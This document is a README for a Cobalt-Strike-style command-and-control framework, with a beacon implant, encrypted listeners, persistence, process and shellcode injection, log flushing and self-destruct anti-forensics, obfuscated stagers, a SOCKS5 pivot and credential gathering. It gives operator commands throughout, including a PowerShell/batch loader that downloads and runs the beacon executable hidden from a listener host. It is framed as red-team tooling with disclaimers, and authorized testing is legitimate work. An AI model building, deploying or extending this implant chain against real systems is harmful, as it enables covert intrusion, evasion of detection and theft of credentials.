# cscli — a Cobalt-Strike-style C2 framework (CLI)

A lightweight, **Python stdlib-only** Command & Control framework modeled on the
Cobalt Strike beacon/team-server model. It is a self-contained toolkit intended
for **authorized security testing, red-team exercises, and education**. You are
responsible for using it only against systems you own or have explicit written
permission to test.

## Architecture

```
┌───────────────────────────────┐        HTTP/JSON        ┌──────────────────────────┐
│   cscli operator console      │                          │   cscli beacon (implant) │
│   (interactive CLI)           │                            │                          │
│  ├─ TeamServer (orchestrator) │◄────── checkin/tasks ───►│  polls /checkin          │
│  │   ├─ Listeners (HTTP)      │  results ───────────────►│  executes tasks          │
│  │   └─ SessionStore (persist)│                          │  returns base64 results  │
└───────────────────────────────┘                          └──────────────────────────┘
```

- **Server side** (`cs/server/`): `TeamServer` owns `Listeners` (HTTP/HTTPS beacon
  endpoints) and a persistent `SessionStore`. It is exactly what the CLI console
  talks to.
- **Client side** (`cs/client/beacon.py`): a self-contained beacon that polls a
  listener, pulls queued tasks, executes them on the target, and posts results.
- **Payload generator** (`cs/payload/`): produces a single-file, standalone
  beacon `.py` (command catalog + modules inlined) that runs outside the package.
- **Crypto** (`cs/crypto/`): pure-Python AES-GCM channel encryption + self-signed
  TLS certificate generation for HTTPS listeners.
- **Modules** (`cs/modules/`): persistence, process injection, anti-forensics,
  obfuscation, exploitation-stage helpers, SOCKS5 pivot, and a gated OS-native
  credential-data interface.
- **Compiled binary** (`scripts/build-binary.sh`): PyInstaller builds a standalone
  64-bit/32-bit executable of the beacon. (PyInstaller does not cross-compile;
  run the script on the OS/arch you target.) A PE delivery chain
  (`cs/modules/dropper.py`) produces a `.ps1`/`.bat` loader that fetches + runs
  the compiled beacon on Windows.

## HTTPS listener + AES-GCM channel encryption

Two transport hardening options are supported:

1. **HTTPS**: `https <name> <port> [host]` starts a TLS listener. A self-signed
   RSA certificate is generated automatically (via `openssl`) on first use.
   The beacon connects with `write_payload(..., no_verify=True)` (or
   `--no-verify`) because the cert is self-signed.

2. **AES-GCM body encryption**: set a passphrase in the console with
   `key <passphrase>`, then any listener you start encrypts the JSON protocol
   envelope with AES-GCM. Generate the matching beacon with the same key:
   `write_payload(url, ..., key=KEY)`. Tampering or a wrong key is rejected
   server-side (GCM tag check).

Wire format (envelope): `nonce(12) || ciphertext || tag(16)`, AES-256-GCM,
key derived via PBKDF2-HMAC-SHA256 from the passphrase.

```bash
# console
cscli> key MyS3cret-Passphrase          # enable AES on new listeners
cscli> https tls 443 0.0.0.0            # HTTPS + AES listener
# generate beacon (same key, no-verify for self-signed)
python3 -c "from cs.payload import write_payload;
write_payload('https://YOUR_SERVER:443','b.py', key='MyS3cret-Passphrase', no_verify=True)"
python3 b.py
```

## Capability modules (beacon command set)

The beacon exposes these taskable commands (also usable from the interactive
`use <id>` prompt):

| Command | Description |
|---|---|
| `persist <mech> <path> [name]` | install persistence. mechanisms: `cron`, `shell-profile`, `xdg-autostart`, `systemd` (Linux); `registry`/`win-runkey` (Windows). `persist list` enumerates. |
| `inject <tech> <pid> <ref>` | process injection. `win-dll <pid> <dllpath>` and `win-shellcode <pid> <b64>` (remote-thread injection, Windows only); `linux-ldpreload` (reference). Refuses to run on wrong OS. |
| `wipe <path> [rounds]` | anti-forensics: overwrite a file with zeros then delete it. |
| `flushlogs` | best-effort flush of OS logs (Linux journal/messages/auth; Windows Event logs). |
| `cleanmru <path>` | remove a path from OS recently-used / MRU lists. |
| `selfdestruct <path>` | wipe this beacon file + temp copies, then exit. |

## Compiled binary + PE delivery

PyInstaller turns the beacon into a standalone executable (no Python needed on
the target). PyInstaller does **not** cross-compile, so:
- On this Linux host: `./scripts/build-binary.sh linux64` → `dist/cscli-beacon`
  (a native ELF for this architecture).
- For Windows (64-bit or 32-bit): run the same script on a Windows host with
  Python 3.8+ to get a native `.exe`.

Run the compiled beacon the same way as the script:
```bash
./cscli-beacon https://SERVER:443 --name <id> --key <Key> --no-verify
```

The PE delivery chain (`cs/modules/dropper.py`) produces a `.ps1`/`.bat` loader
that downloads the compiled `.exe` from a listener and executes it hidden — the
typical first-stage for Windows targets. Serve the `.exe` at the listener and
deploy the loader:
```python
from cs.modules.dropper import write_pe_loader
write_pe_loader("https://SERVER:443/beacon.exe", "loader.ps1")
```

## SOCKS5 pivot (reach internal networks through the C2)

Run `socks <port>` on a beacon (e.g. `socks 1080`). It starts a local SOCKS5
server. Point your tools / proxychains / browser at the beacon's address and
the beacon tunnels each connection back through the C2 listener, which dials
the requested internal host and relays the stream. Standard for reaching
internal networks the operator cannot touch directly.

```bash
cscli> use <session>
beacon[<session>]> socks 1080
# on operator machine: proxychains curl --socks5 <beacon_ip>:1080 http://10.x.x.x/
```
`proxychains4 -q -f p.conf <tool>` with `socks5 <beacon_ip> 1080` in `p.conf`.

## Gated OS-native credential interface

The `creds` beacon command (`creds [env|windows|linux|all]`) reports credentials
the operating system exposes to the **calling user** through documented APIs:
Windows Credential Manager (`cmdkey`), the user's environment, and (on Linux)
the session kernel keyring. This is **not** a Mimikatz dump — it does not scrape
LSASS memory or recover account passwords, and it refuses to be useful against
accounts other than the operator's own test host. Use only on systems you are
authorised to test.

## Obfuscation & exploitation-stage helpers

`cs/modules/obfuscation.py`:
- `obfuscate_payload(src)` — self-decrypting zlib+XOR+base64 payload wrapper.
- `polyglot_loader(url)` / `string_mask`, etc.

`cs/modules/exploitation.py`:
- `make_stager(url)` / `build_beacon_drop(stager, path)` — staged delivery with an
  obfuscated stage-1 that pulls the full beacon.
- `encode_pe_stager(path)` — wrap a compiled binary for staged delivery.
- `protocol_replay(...)` — validate tasking on the C2 protocol without OS touch.

## Protocol

The beacon talks JSON over HTTP POST to the listener:

```
Beacon -> Server   /checkin { beacon_id, meta{...}, results:[{id,data}...] }
Server -> Beacon   { session_id, interval, tasks:[{id,cmd}...], commands:[...] }
```

A check-in both *delivers results* for completed tasks and *pulls new tasks* to
run. Tasks are queued by the operator and marked `queued -> sent -> completed`.

## Commands (beacon-side)

`help` lists them; full set: `shell`, `cd`, `pwd`, `ls`, `cat`, `download`,
`upload <path>;<b64>`, `info`, `whoami`, `sysinfo`, `sleep <sec>`, `exec
<python>`, `exit`.

## Quick start

```bash
# 1. Run the team server console
python3 cscli

# 2. Inside the console, start a listener
cscli> listener main 8080 0.0.0.0

# 3. Generate a beacon payload for the target (in another terminal)
python3 -c "from cs.payload import write_payload;
write_payload('http://YOUR_SERVER:8080', 'beacon.py', interval=3)"

# 4. Deploy and run the beacon on the authorized target:
python3 beacon.py

# 5. Back in the console, see the session and drive it
cscli> sessions
cscli> use <session_id>
beacon[<session_id>]> shell id
beacon[<session_id>]> pwd
beacon[<session_id>]> exit
cscli> results <session_id>
```

## Console commands

| Command | Description |
|---|---|
| `listener <name> <port> [host]` | start an HTTP listener |
| `listener-stop <name>` | stop a listener |
| `listeners` | list running listeners |
| `sessions` | list active beacons (marks STALE if not seen recently) |
| `use <id>` / `interactive` | enter interactive mode to task a beacon |
| `results <id>` | show collected results for a session |
| `clear-results <id>` | drop saved results |
| `sleep <sec>` | default beacon callback interval |
| `help` / `quit` | help / exit |

## Persistence

Session, task, and result state is JSON-persisted under `data/sessions.json`
(customize the dir with the `CSCLI_DATA_DIR` env var). Restarting the console
restores prior sessions.

## Testing

The repo ships three self-tests (no live C2 traffic between hosts, all localhost):

```bash
python3 test_e2e.py      # API-level: store + listener + in-process roundtrip
python3 test_live.py     # real beacon subprocess + tasking from a driver
python3 test_operator.py # full operator console drives a live beacon end-to-end
python3 test_tls.py      # HTTPS + AES-GCM encrypted channel + module tasking
python3 test_socks.py    # SOCKS5 pivot tunnels to an internal network
python3 test_compiled.py # PyInstaller-compiled beacon executable end-to-end
```

## Layout

```
cs/
  __init__.py
  commands.py            # shared command catalog + validation
  crypto/                # pure-Python AES + GCM cipher; TLS cert generation
    aes.py  __init__.py  certs.py
  server/                # TeamServer, HTTP(S) listener, session store, SOCKS relay
  client/beacon.py       # self-contained beacon / implant
  payload/               # standalone payload generation (inlines all deps)
  modules/               # persistence, injection, antiforensics, obfuscation,
                         #   socks (SOCKS5 pivot), credentials, dropper (PE chain),
                         #   exploitation
  cli/console.py         # interactive operator CLI
build/beacon_entry.py    # PyInstaller entrypoint
scripts/build-binary.sh  # builds the standalone beacon executable
test_*.py                # self-tests (see Testing)
```

## Disclaimer

This software is provided for authorized security testing and education. Do not
use it against any system without explicit permission. Running implants on
unauthorized systems is illegal and unethical.
